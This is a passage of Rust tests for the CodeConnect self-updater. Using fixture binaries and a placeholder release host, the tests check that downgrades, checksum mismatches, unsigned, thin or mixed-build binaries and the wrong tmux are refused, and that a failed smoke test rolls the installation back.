    /// A minimal fat header carrying both release architectures: enough for
    /// `is_universal` to read, with the version line riding behind it for the
    /// injected probe. `arm64_only` produces the thin-slice refusal case.
    fn fixture_binary(name: &str, version: &str, build: &str, arm64_only: bool) -> Vec<u8> {
        let mut bytes = fat_header(arm64_only);
        bytes.extend_from_slice(format!("\nSAYS:{name} {version} ({build})\n").as_bytes());
        // Every `codeconnect` a scenario builds requires the same tmux.
        if name == "codeconnect" {
            bytes.extend_from_slice(format!("ASK --tmux-version:{TMUX_LINE}\n").as_bytes());
        }
        bytes
    }

    /// The `cc-tmux -V` line every fixture `codeconnect` requires.
    const TMUX_LINE: &str = "tmux 3.7c-cc9";

    /// A fixture `cc-tmux` answering `-V` with `says`. `origin` only makes
    /// two otherwise identical files tell apart which one got installed.
    fn fixture_tmux(says: &str, origin: &str, arm64_only: bool) -> Vec<u8> {
        let mut bytes = fat_header(arm64_only);
        bytes.extend_from_slice(format!("\nASK -V:{says}\nFROM:{origin}\n").as_bytes());
        bytes
    }

    fn fat_header(arm64_only: bool) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend_from_slice(&0xcafe_babe_u32.to_be_bytes());
        let cputypes: &[u32] = if arm64_only {
            &[0x0100_000c]
        } else {
            &[0x0100_000c, 0x0100_0007]
        };
        bytes.extend_from_slice(&(cputypes.len() as u32).to_be_bytes());
        for cputype in cputypes {
            let mut entry = [0u8; 20];
            entry[..4].copy_from_slice(&cputype.to_be_bytes());
            bytes.extend_from_slice(&entry);
        }
        bytes
    }

    /// Write a fixture binary the way a binary exists on disk: executable.
    /// The real pipeline — tar, extraction, `fs::copy`, the exchange — must
    /// carry that bit through, and the probe below refuses a file without it.
    fn place_binary(path: &std::path::Path, bytes: Vec<u8>) {
        use std::os::unix::fs::PermissionsExt;
        std::fs::write(path, bytes).unwrap();
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    /// The `SAYS:` line a fixture binary carries — the injected stand-in for
    /// running `--version`. It reads the file instead of executing it, but
    /// holds the file to what execution would require: a file without the
    /// executable bit "does not run", exactly as `exec` would refuse it.
    fn probe_says(path: &std::path::Path) -> Result<String> {
        line_after(path, "SAYS:")
    }

    /// The injected stand-in for running `path <question>`: the `ASK` line
    /// the fixture carries for that question, under the same rule as
    /// `probe_says`.
    fn ask_says(path: &std::path::Path, question: &str) -> Result<String> {
        line_after(path, &format!("ASK {question}:"))
    }

    fn line_after(path: &std::path::Path, prefix: &str) -> Result<String> {
        use std::os::unix::fs::PermissionsExt;
        let metadata = std::fs::metadata(path).with_context(|| format!("{}", path.display()))?;
        if metadata.permissions().mode() & 0o111 == 0 {
            anyhow::bail!("{} is not executable", path.display());
        }
        let content = std::fs::read(path).with_context(|| format!("{}", path.display()))?;
        let text = String::from_utf8_lossy(&content);
        text.lines()
            .find_map(|line| line.strip_prefix(prefix))
            .map(str::to_string)
            .ok_or_else(|| anyhow::anyhow!("{} does not run", path.display()))
    }

    /// Everything one scenario needs on disk: a root with a live set and a
    /// packaged release with its checksum, addressable by asset URL.
    struct Rig {
        root: PathBuf,
        live: PathBuf,
        body: Vec<u8>,
        by_url: BTreeMap<String, PathBuf>,
        /// What each live binary said before the update — the reference the
        /// smoke-failure fault uses to tell the new file from the old one.
        old_lines: BTreeMap<String, String>,
    }

    /// The rig owns its temporary root; scenarios come and go with `cargo
    /// test` and must not accumulate under the temp directory.
    impl Drop for Rig {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.root);
        }
    }

    /// What one scenario may break, each `None`/`Ok` by default.
    #[derive(Default)]
    struct Faults {
        /// Fail the Nth signature judgment (1-based).
        refuse_signature_call: Option<usize>,
        /// Fail the smoke probe of this binary at its installed path.
        refuse_live_probe_of: Option<&'static str>,
        /// What the daemon restart reports.
        restart: Option<std::result::Result<bool, String>>,
    }

    struct Ran {
        outcome: Result<()>,
        /// Every seam crossing, in order: `fetch`,
        /// `download <url> (max <bytes>)`, `verify <place>/<file>`,
        /// `probe <place>/<file>`, `ask <place>/<file> <question>`, `restart`.
        events: Vec<String>,
    }

    fn rig(version: &str, live_builds: [&str; 3]) -> Rig {
        // Distinct per rig, not per moment: parallel tests share the pid
        // and can share the millisecond, and two rigs on one root would race
        // each other's update lock and live set.
        static NTH: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
        let root = std::env::temp_dir().join(format!(
            "cc-update-{}-{}-{}",
            std::process::id(),
            protocol::time::now_unix_ms(),
            NTH.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        ));
        let live = root.join("bin");
        std::fs::create_dir_all(&live).unwrap();
        // The live set: one build id per binary so a scenario can skew them,
        // plus a stranger the update must carry through untouched.
        let mut old_lines = BTreeMap::new();
        for (binary, build) in ["codeconnect", "ccd", "cc-hook"].iter().zip(live_builds) {
            place_binary(
                &live.join(binary),
                fixture_binary(binary, env!("CARGO_PKG_VERSION"), build, false),
            );
            old_lines.insert(binary.to_string(), probe_says(&live.join(binary)).unwrap());
        }
        place_binary(
            &live.join("cc-tmux"),
            fixture_tmux(TMUX_LINE, "live", false),
        );
        std::fs::write(live.join("THIRD_PARTY_NOTICES"), b"the live notices").unwrap();
        std::fs::write(live.join("stranger.txt"), b"not ours to judge").unwrap();

        let fixtures = root.join("fixtures");
        let dir = fixtures.join(format!("codeconnect-{version}"));
        std::fs::create_dir_all(&dir).unwrap();
        for binary in ["codeconnect", "ccd", "cc-hook"] {
            place_binary(
                &dir.join(binary),
                fixture_binary(binary, version, "bbbbbbbbbbbb", false),
            );
        }
        std::fs::write(dir.join("LICENSE"), b"the licence").unwrap();
        place_binary(
            &dir.join("cc-tmux"),
            fixture_tmux(TMUX_LINE, "release", false),
        );
        std::fs::write(dir.join("THIRD_PARTY_NOTICES"), b"the release notices").unwrap();

        let mut by_url = BTreeMap::new();
        let mut listed = Vec::new();
        for archive in [Archive::Core, Archive::Tmux] {
            package(&fixtures, version, archive);
            for name in [archive.name(version), archive.checksum_name(version)] {
                let url = format!("https://release.invalid/{name}");
                by_url.insert(url.clone(), fixtures.join(&name));
                let size = std::fs::metadata(fixtures.join(&name)).unwrap().len();
                listed.push(format!(
                    r#"{{"name":"{name}","browser_download_url":"{url}","size":{size}}}"#
                ));
            }
        }
        let body = format!(
            r#"{{"tag_name":"v{version}","assets":[{}]}}"#,
            listed.join(",")
        )
        .into_bytes();

        Rig {
            root,
            live,
            body,
            by_url,
            old_lines,
        }
    }

    fn run(rig: &Rig, faults: Faults) -> Ran {
        run_entry(rig, faults, run_update_at)
    }

    /// One scenario through `entry`: `codeconnect update`, or the tmux a
    /// session start installs.
    fn run_entry(
        rig: &Rig,
        faults: Faults,
        entry: impl Fn(&std::path::Path, &UpdateDeps) -> Result<()>,
    ) -> Ran {
        let events: RefCell<Vec<String>> = RefCell::new(Vec::new());
        let signature_calls = RefCell::new(0usize);

        let fetch = || {
            events.borrow_mut().push("fetch".to_string());
            Ok(rig.body.clone())
        };
        let download = |url: &str, into: &std::path::Path, max: u64| {
            // The ceiling is part of the contract — a caller passing the
            // wrong bound would download with the wrong protection, so it is
            // recorded for the assertions, not discarded.
            events
                .borrow_mut()
                .push(format!("download {url} (max {max})"));
            let from = rig
                .by_url
                .get(url)
                .ok_or_else(|| anyhow::anyhow!("no such asset: {url}"))?;
            std::fs::copy(from, into).map(|_| ()).map_err(Into::into)
        };
        let verify = |path: &std::path::Path| {
            let call = {
                let mut count = signature_calls.borrow_mut();
                *count += 1;
                *count
            };
            let name = path.file_name().unwrap().to_string_lossy().into_owned();
            let place = if path.parent() == Some(rig.live.as_path()) {
                "live"
            } else {
                "staged"
            };
            events.borrow_mut().push(format!("verify {place}/{name}"));
            if faults.refuse_signature_call == Some(call) {
                anyhow::bail!("{name} is not signed by CodeConnect");
            }
            Ok(())
        };
        let probe = |path: &std::path::Path| {
            let name = path.file_name().unwrap().to_string_lossy().into_owned();
            let place = if path.parent() == Some(rig.live.as_path()) {
                "live"
            } else {
                "staged"
            };
            events.borrow_mut().push(format!("probe {place}/{name}"));
            if place == "live" && faults.refuse_live_probe_of == Some(name.as_str()) {
                // Refuses only the *new* file at the live path — the smoke
                // test after the exchange — never the pre-update reading of
                // the old set, which is told apart by the exact line the rig
                // recorded before the update began.
                let is_the_old_file =
                    probe_says(path).is_ok_and(|says| Some(&says) == rig.old_lines.get(&name));
                if !is_the_old_file {
                    anyhow::bail!("{name} does not run here");
                }
            }
            probe_says(path)
        };
        let ask = |path: &std::path::Path, question: &str| {
            let name = path.file_name().unwrap().to_string_lossy().into_owned();
            let place = if path.parent() == Some(rig.live.as_path()) {
                "live"
            } else {
                "staged"
            };
            events
                .borrow_mut()
                .push(format!("ask {place}/{name} {question}"));
            // The smoke test of the new `cc-tmux` at the live path, told apart
            // from the reading of the one installed before by where it came
            // from.
            if place == "live"
                && faults.refuse_live_probe_of == Some(name.as_str())
                && line_after(path, "FROM:").is_ok_and(|origin| origin != "live")
            {
                anyhow::bail!("{name} does not run here");
            }
            ask_says(path, question)
        };
        let restart = || {
            events.borrow_mut().push("restart".to_string());
            match &faults.restart {
                None => Ok(true),
                Some(Ok(loaded)) => Ok(*loaded),
                Some(Err(why)) => Err(anyhow::anyhow!("{why}")),
            }
        };

        let deps = UpdateDeps {
            fetch_release: &fetch,
            download: &download,
            verify_signature: &verify,
            probe_version: &probe,
            ask: &ask,
            restart_daemon: &restart,
        };
        let outcome = entry(&rig.root, &deps);
        Ran {
            outcome,
            events: events.into_inner(),
        }
    }

    fn snapshot(dir: &std::path::Path) -> BTreeMap<String, Vec<u8>> {
        std::fs::read_dir(dir)
            .unwrap()
            .map(|entry| {
                let entry = entry.unwrap();
                (
                    entry.file_name().to_string_lossy().into_owned(),
                    std::fs::read(entry.path()).unwrap(),
                )
            })
            .collect()
    }

    /// The version this test binary was compiled as — the "running" version
    /// every scenario is judged against.
    fn running() -> String {
        env!("CARGO_PKG_VERSION").to_string()
    }

    fn newer() -> String {
        let (major, minor, patch) = installed_version();
        format!("{major}.{minor}.{patch}", patch = patch + 1,)
    }

    #[test]
    fn a_downgrade_is_refused_before_a_byte_is_downloaded() {
        let fixture = rig("0.0.1", ["aaaaaaaaaaaa"; 3]);
        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_err());
        assert_eq!(
            ran.events,
            vec!["fetch".to_string()],
            "asking what the latest release is came first and nothing followed it"
        );
        assert_eq!(snapshot(&fixture.live), before, "the live set is untouched");
    }

    #[test]
    fn a_current_set_downloads_nothing() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
        assert!(
            !ran.events.iter().any(|event| event.starts_with("download")),
            "nothing to do means nothing fetched: {:?}",
            ran.events
        );
        assert!(!ran.events.contains(&"restart".to_string()));
        assert_eq!(snapshot(&fixture.live), before);
    }

    #[test]
    fn an_equal_version_skew_is_repaired_not_blessed() {
        // Same version, three binaries from two builds: the state a release
        // never produced, repaired by reinstalling the release.
        let fixture = rig(&running(), ["aaaaaaaaaaaa", "cccccccccccc", "aaaaaaaaaaaa"]);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
        for binary in ["codeconnect", "ccd", "cc-hook"] {
            assert_eq!(
                probe_says(&fixture.live.join(binary)).unwrap(),
                format!("{binary} {} (bbbbbbbbbbbb)", running()),
                "the skewed set was replaced by the release, each binary its own"
            );
        }
    }

    #[test]
    fn a_wrong_checksum_stops_the_install_with_the_live_set_untouched() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let checksum = fixture
            .root
            .join("fixtures")
            .join(Archive::Core.checksum_name(&newer()));
        let name = Archive::Core.name(&newer());
        std::fs::write(checksum, format!("{}  {name}\n", "ab".repeat(32))).unwrap();

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_err());
        assert!(!ran.events.iter().any(|event| event == "restart"));
        assert!(
            !ran.events.iter().any(|event| event.starts_with("verify")),
            "a mismatched archive is never handed to the signature judge"
        );
        assert_eq!(snapshot(&fixture.live), before);
    }

    #[test]
    fn an_archive_with_a_directory_member_is_refused_whole() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        // Repackage the same tree the wrong way: naming the directory writes
        // a directory member the validator refuses.
        let fixtures = fixture.root.join("fixtures");
        let archive_name = Archive::Core.name(&newer());
        let status = std::process::Command::new("tar")
            .current_dir(&fixtures)
            .arg("-czf")
            .arg(&archive_name)
            .arg(format!("codeconnect-{}", newer()))
            .status()
            .unwrap();
        assert!(status.success());
        let digest = crate::update_install::digest_of(&fixtures.join(&archive_name)).unwrap();
        let hex: String = digest.iter().map(|byte| format!("{byte:02x}")).collect();
        std::fs::write(
            fixtures.join(Archive::Core.checksum_name(&newer())),
            format!("{hex}  {archive_name}\n"),
        )
        .unwrap();

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_err());
        assert!(!ran.events.iter().any(|event| event.starts_with("verify")));
        assert_eq!(snapshot(&fixture.live), before);
    }

    #[test]
    fn a_refused_signature_on_any_of_the_four_stops_everything() {
        for call in 1..=4 {
            let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
            let before = snapshot(&fixture.live);
            let ran = run(
                &fixture,
                Faults {
                    refuse_signature_call: Some(call),
                    ..Faults::default()
                },
            );
            assert!(ran.outcome.is_err(), "call {call} refused");
            assert!(!ran.events.contains(&"restart".to_string()));
            assert_eq!(
                snapshot(&fixture.live),
                before,
                "refusal on signature {call} left the live set untouched"
            );
        }
    }

    #[test]
    fn a_thin_binary_in_the_archive_is_refused() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        // Rebuild the archive with one thin slice — signed, versioned, and
        // still not installable.
        let fixtures = fixture.root.join("fixtures");
        let dir = fixtures.join(format!("codeconnect-{}", newer()));
        place_binary(
            &dir.join("ccd"),
            fixture_binary("ccd", &newer(), "bbbbbbbbbbbb", true),
        );
        repackage(&fixture, &newer());

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_err());
        assert_eq!(snapshot(&fixture.live), before);
    }

    #[test]
    fn an_archive_whose_binaries_mix_builds_is_refused() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let fixtures = fixture.root.join("fixtures");
        let dir = fixtures.join(format!("codeconnect-{}", newer()));
        place_binary(
            &dir.join("cc-hook"),
            fixture_binary("cc-hook", &newer(), "dddddddddddd", false),
        );
        repackage(&fixture, &newer());

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        let refused = ran.outcome.unwrap_err().to_string();
        assert!(refused.contains("mixes builds"), "{refused}");
        assert_eq!(snapshot(&fixture.live), before);
    }

    #[test]
    fn a_binary_reporting_the_wrong_version_is_refused() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let fixtures = fixture.root.join("fixtures");
        let dir = fixtures.join(format!("codeconnect-{}", newer()));
        place_binary(
            &dir.join("codeconnect"),
            fixture_binary("codeconnect", "9.9.9", "bbbbbbbbbbbb", false),
        );
        repackage(&fixture, &newer());

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_err());
        assert_eq!(snapshot(&fixture.live), before);
    }

    /// Rebuild the fixture archives and checksums after a scenario edited the
    /// tree — the same packaging the rig itself uses. The sizes the release
    /// listing states are the originals; every edit here keeps them small.
    fn repackage(fixture: &Rig, version: &str) {
        let fixtures = fixture.root.join("fixtures");
        for archive in [Archive::Core, Archive::Tmux] {
            package(&fixtures, version, archive);
        }
    }

    /// Package one archive from `fixtures/codeconnect-<version>/`, naming each
    /// member as the release workflow does, and write its checksum.
    fn package(fixtures: &std::path::Path, version: &str, archive: Archive) {
        let name = archive.name(version);
        let status = std::process::Command::new("tar")
            .current_dir(fixtures)
            .arg("-czf")
            .arg(&name)
            .args(crate::update_release::expected_members(version, archive))
            .status()
            .unwrap();
        assert!(status.success(), "tar packages the fixture");
        let digest = crate::update_install::digest_of(&fixtures.join(&name)).unwrap();
        let hex: String = digest.iter().map(|byte| format!("{byte:02x}")).collect();
        std::fs::write(
            fixtures.join(archive.checksum_name(version)),
            format!("{hex}  {name}\n"),
        )
        .unwrap();
    }

    #[test]
    fn a_successful_update_downloads_verifies_exchanges_and_only_then_restarts() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);

        // Exactly the four assets the release named, each under the ceiling
        // that protects its kind of file — nothing else, nothing unbounded.
        let downloads: Vec<&String> = ran
            .events
            .iter()
            .filter(|event| event.starts_with("download"))
            .collect();
        let core = Archive::Core.name(&newer());
        let tmux = Archive::Tmux.name(&newer());
        let max = crate::update_release::MAX_ARCHIVE_BYTES;
        assert_eq!(
            downloads,
            vec![
                &format!("download https://release.invalid/{core} (max {max})"),
                &format!("download https://release.invalid/{core}.sha256 (max 4096)"),
                &format!("download https://release.invalid/{tmux} (max {max})"),
                &format!("download https://release.invalid/{tmux}.sha256 (max 4096)"),
            ]
        );

        // The signature judgment landed on the four unpacked candidates —
        // each exactly once, never on a live path, never on the same file
        // twice while another goes unjudged.
        let verifies: Vec<&String> = ran
            .events
            .iter()
            .filter(|event| event.starts_with("verify"))
            .collect();
        assert_eq!(
            verifies,
            vec![
                "verify staged/codeconnect",
                "verify staged/ccd",
                "verify staged/cc-hook",
                "verify staged/cc-tmux"
            ]
        );
        // And per binary, judged before it is ever run: running first would
        // execute downloaded code whose signature nobody has looked at.
        for (binary, run) in [
            ("codeconnect", "probe staged/codeconnect"),
            ("ccd", "probe staged/ccd"),
            ("cc-hook", "probe staged/cc-hook"),
            ("codeconnect", "ask staged/codeconnect --tmux-version"),
            ("cc-tmux", "ask staged/cc-tmux -V"),
        ] {
            let judged = ran
                .events
                .iter()
                .position(|event| event == &format!("verify staged/{binary}"))
                .unwrap();
            let executed = ran
                .events
                .iter()
                .position(|event| event == run)
                .unwrap_or_else(|| panic!("{run} missing from {:?}", ran.events));
            assert!(judged < executed, "{binary} was judged before `{run}`");
        }

        // Every judgment before the smoke test, the smoke test on all three
        // installed paths, the restart dead last. The *last* probe of each
        // live path is the smoke test — the first is the pre-update reading
        // of the old set.
        let last = |needle: &str| {
            ran.events
                .iter()
                .rposition(|event| event == needle)
                .unwrap_or_else(|| panic!("{needle} missing from {:?}", ran.events))
        };
        let last_verify = ran
            .events
            .iter()
            .rposition(|event| event.starts_with("verify"))
            .unwrap();
        for smoke in [
            "probe live/codeconnect",
            "probe live/ccd",
            "probe live/cc-hook",
            "ask live/cc-tmux -V",
        ] {
            let smoke_at = last(smoke);
            assert!(
                last_verify < smoke_at,
                "every signature judged before `{smoke}`"
            );
            assert!(smoke_at < last("restart"), "restart waits for `{smoke}`");
        }
        assert_eq!(ran.events.last().map(String::as_str), Some("restart"));

        let after = snapshot(&fixture.live);
        for binary in ["codeconnect", "ccd", "cc-hook"] {
            assert_eq!(
                probe_says(&fixture.live.join(binary)).unwrap(),
                format!("{binary} {} (bbbbbbbbbbbb)", newer()),
                "the file installed under this name is this binary, not a copy \
                 of another that happens to share the build"
            );
        }
        assert_eq!(
            line_after(&fixture.live.join("cc-tmux"), "FROM:").unwrap(),
            "release",
            "the release's tmux replaced the one installed before"
        );
        assert_eq!(after["THIRD_PARTY_NOTICES"], b"the release notices");
        assert_eq!(
            after["stranger.txt"], b"not ours to judge",
            "a file the release does not ship survives the exchange"
        );
        assert!(
            !crate::update_install::staging_dir(&fixture.root).exists(),
            "nothing left behind"
        );
        assert!(!fixture.root.join("update.work").exists());
    }

    #[test]
    fn a_smoke_failure_of_any_binary_restores_the_previous_set_and_never_restarts() {
        for binary in ["codeconnect", "ccd", "cc-hook", "cc-tmux"] {
            let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
            let before = snapshot(&fixture.live);
            let ran = run(
                &fixture,
                Faults {
                    refuse_live_probe_of: Some(binary),
                    ..Faults::default()
                },
            );
            let said = ran.outcome.unwrap_err().to_string();
            assert!(said.contains("put back"), "{binary}: {said}");
            assert!(!ran.events.contains(&"restart".to_string()));
            assert_eq!(
                snapshot(&fixture.live),
                before,
                "{binary} failing its smoke test restored the previous set byte for byte"
            );
        }
    }

    #[test]
    fn a_failed_restart_keeps_the_installed_set_and_says_so() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let ran = run(
            &fixture,
            Faults {
                restart: Some(Err("launchd said no".to_string())),
                ..Faults::default()
            },
        );
        let said = ran.outcome.unwrap_err().to_string();
        assert!(said.contains("restart"), "{said}");
        for binary in ["codeconnect", "ccd", "cc-hook"] {
            assert_eq!(
                probe_says(&fixture.live.join(binary)).unwrap(),
                format!("{binary} {} (bbbbbbbbbbbb)", newer()),
                "the proven install stays installed; only the restart failed"
            );
        }
    }

    // ----------------------------------------------------------------- tmux

    /// Current binaries with no tmux beside them: what an updater from before
    /// tmux shipped leaves. Only tmux is fetched and installed, the binaries
    /// stay byte for byte, and the daemon keeps running.
    #[test]
    fn current_binaries_without_their_tmux_get_only_the_tmux() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        std::fs::remove_file(fixture.live.join("cc-tmux")).unwrap();
        std::fs::remove_file(fixture.live.join("THIRD_PARTY_NOTICES")).unwrap();
        let before = snapshot(&fixture.live);

        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
        let tmux = Archive::Tmux.name(&running());
        let downloads: Vec<&String> = ran
            .events
            .iter()
            .filter(|event| event.starts_with("download"))
            .collect();
        assert_eq!(
            downloads,
            vec![
                &format!(
                    "download https://release.invalid/{tmux} (max {})",
                    crate::update_release::MAX_ARCHIVE_BYTES
                ),
                &format!("download https://release.invalid/{tmux}.sha256 (max 4096)"),
            ]
        );
        assert!(!ran.events.contains(&"restart".to_string()));

        let after = snapshot(&fixture.live);
        for (name, bytes) in &before {
            assert_eq!(&after[name], bytes, "{name} was carried across unchanged");
        }
        assert_eq!(
            line_after(&fixture.live.join("cc-tmux"), "FROM:").unwrap(),
            "release"
        );
        assert_eq!(after["THIRD_PARTY_NOTICES"], b"the release notices");
        assert!(!crate::update_install::staging_dir(&fixture.root).exists());
        assert!(!fixture.root.join("update.work").exists());

        // And then there is nothing left to do.
        let again = run(&fixture, Faults::default());
        assert!(again.outcome.is_ok(), "{:?}", again.outcome);
        assert!(!again
            .events
            .iter()
            .any(|event| event.starts_with("download")));
    }

    /// A tmux that is there but not the one the binaries require, or not
    /// CodeConnect's, or not both architectures, is repaired rather than
    /// blessed.
    #[test]
    fn a_wrong_unsigned_or_thin_tmux_beside_current_binaries_is_replaced() {
        for (live_tmux, refuse_signature_call) in [
            (fixture_tmux("tmux 3.7c-cc8", "live", false), None),
            // The first judgment is the live `cc-tmux`'s.
            (fixture_tmux(TMUX_LINE, "live", false), Some(1)),
            (fixture_tmux(TMUX_LINE, "live", true), None),
        ] {
            let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
            place_binary(&fixture.live.join("cc-tmux"), live_tmux);
            let ran = run(
                &fixture,
                Faults {
                    refuse_signature_call,
                    ..Faults::default()
                },
            );
            assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
            assert_eq!(
                line_after(&fixture.live.join("cc-tmux"), "FROM:").unwrap(),
                "release"
            );
        }
    }

    /// The release's tmux has to be the build its own `codeconnect` names: a
    /// correctly signed tmux from another release is not this release.
    #[test]
    fn a_release_whose_tmux_is_not_the_one_its_codeconnect_requires_is_refused() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let dir = fixture
            .root
            .join("fixtures")
            .join(format!("codeconnect-{}", newer()));
        place_binary(
            &dir.join("cc-tmux"),
            fixture_tmux("tmux 3.7c-cc8", "release", false),
        );
        repackage(&fixture, &newer());

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        let said = ran.outcome.unwrap_err().to_string();
        assert!(said.contains("requires `tmux 3.7c-cc9`"), "{said}");
        assert!(!ran.events.contains(&"restart".to_string()));
        assert_eq!(snapshot(&fixture.live), before);
    }

    #[test]
    fn a_thin_tmux_in_the_release_is_refused() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let dir = fixture
            .root
            .join("fixtures")
            .join(format!("codeconnect-{}", newer()));
        place_binary(
            &dir.join("cc-tmux"),
            fixture_tmux(TMUX_LINE, "release", true),
        );
        repackage(&fixture, &newer());

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        assert!(ran.outcome.is_err());
        assert_eq!(snapshot(&fixture.live), before);
    }

    /// A release without the tmux archive is refused before anything is
    /// downloaded: installing its binaries alone would leave a machine that
    /// cannot start a session.
    #[test]
    fn a_release_without_its_tmux_is_refused_before_any_download() {
        let mut fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        let tmux = Archive::Tmux.name(&newer());
        let mut release: serde_json::Value = serde_json::from_slice(&fixture.body).unwrap();
        release["assets"]
            .as_array_mut()
            .unwrap()
            .retain(|asset| !asset["name"].as_str().unwrap().starts_with(&tmux));
        fixture.body = serde_json::to_vec(&release).unwrap();

        let before = snapshot(&fixture.live);
        let ran = run(&fixture, Faults::default());
        let said = ran.outcome.unwrap_err().to_string();
        assert!(said.contains(&tmux), "{said}");
        assert!(!ran.events.iter().any(|event| event.starts_with("download")));
        assert_eq!(snapshot(&fixture.live), before);
    }

    // ------------------------------------------------------ session start

    fn ensure(root: &std::path::Path, deps: &UpdateDeps) -> Result<()> {
        ensure_tmux_at(root, &running(), deps)
    }

    /// The first session after an updater that predates tmux: only tmux is
    /// fetched, from this version's own release, and the daemon is left
    /// alone. The next session finds it and fetches nothing.
    #[test]
    fn a_session_start_without_tmux_installs_it_once_from_its_own_release() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        std::fs::remove_file(fixture.live.join("cc-tmux")).unwrap();
        std::fs::remove_file(fixture.live.join("THIRD_PARTY_NOTICES")).unwrap();
        let before = snapshot(&fixture.live);

        let ran = run_entry(&fixture, Faults::default(), ensure);
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
        let tmux = Archive::Tmux.name(&running());
        assert_eq!(
            ran.events
                .iter()
                .filter(|event| event.starts_with("download"))
                .count(),
            2,
            "the tmux archive and its checksum: {:?}",
            ran.events
        );
        assert!(ran
            .events
            .iter()
            .any(|event| event.contains(&format!("/{tmux} "))));
        assert!(!ran.events.contains(&"restart".to_string()));
        let after = snapshot(&fixture.live);
        for (name, bytes) in &before {
            assert_eq!(&after[name], bytes, "{name} was carried across unchanged");
        }
        assert_eq!(
            line_after(&fixture.live.join("cc-tmux"), "FROM:").unwrap(),
            "release"
        );

        let again = run_entry(&fixture, Faults::default(), ensure);
        assert!(again.outcome.is_ok(), "{:?}", again.outcome);
        assert!(again.events.is_empty(), "{:?}", again.events);
    }

    /// GitHub answering for another release is not this binary's release,
    /// however well formed: nothing is downloaded from it.
    #[test]
    fn a_session_start_refuses_a_release_that_is_not_its_own() {
        let fixture = rig(&newer(), ["aaaaaaaaaaaa"; 3]);
        std::fs::remove_file(fixture.live.join("cc-tmux")).unwrap();
        let before = snapshot(&fixture.live);
        let ran = run_entry(&fixture, Faults::default(), ensure);
        let said = ran.outcome.unwrap_err().to_string();
        assert!(said.contains("answered with"), "{said}");
        assert_eq!(ran.events, vec!["fetch".to_string()]);
        assert_eq!(snapshot(&fixture.live), before);
    }

    /// A session start that meets a running installation waits for it, and
    /// then installs.
    #[test]
    fn a_session_start_waits_for_another_installation() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        std::fs::remove_file(fixture.live.join("cc-tmux")).unwrap();
        let held = claim_throttle_at(&update_lock_path(&fixture.root)).unwrap();
        let releaser = std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_millis(600));
            drop(held);
        });
        let started = std::time::Instant::now();
        let ran = run_entry(&fixture, Faults::default(), ensure);
        releaser.join().unwrap();
        assert!(ran.outcome.is_ok(), "{:?}", ran.outcome);
        assert!(
            started.elapsed() >= std::time::Duration::from_millis(600),
            "it waited for the holder"
        );
        assert_eq!(
            line_after(&fixture.live.join("cc-tmux"), "FROM:").unwrap(),
            "release"
        );
    }

    /// Only the installed binary, with nothing named in its place and no tmux
    /// beside it, installs one.
    #[test]
    fn only_the_installed_binary_without_tmux_installs_one() {
        let fixture = rig(&running(), ["aaaaaaaaaaaa"; 3]);
        let exe = fixture.live.join("codeconnect");
        let linked = fixture.root.join("linked-codeconnect");
        std::os::unix::fs::symlink(&exe, &linked).unwrap();
        let elsewhere = fixture.root.join("fixtures").join("codeconnect");
        std::fs::write(&elsewhere, b"").unwrap();

        // tmux is present.
        assert!(!bootstrap_applies(false, &exe, &fixture.live));
        std::fs::remove_file(fixture.live.join("cc-tmux")).unwrap();
        assert!(bootstrap_applies(false, &exe, &fixture.live));
        assert!(bootstrap_applies(false, &linked, &fixture.live));
        // A tmux was named explicitly, or this is some other binary.
        assert!(!bootstrap_applies(true, &exe, &fixture.live));
        assert!(!bootstrap_applies(false, &elsewhere, &fixture.live));
    }

    // ------------------------------------------------- the website installer

    /// Run `install-staged` against the release binaries the rig unpacked, as
    /// the installer hands them over.
    fn install_staged(fixture: &Rig, faults: Faults) -> Ran {
        let from = fixture
            .root
            .join("fixtures")
            .join(format!("codeconnect-{}", running()));
        run_entry(fixture, faults, |root, deps| {
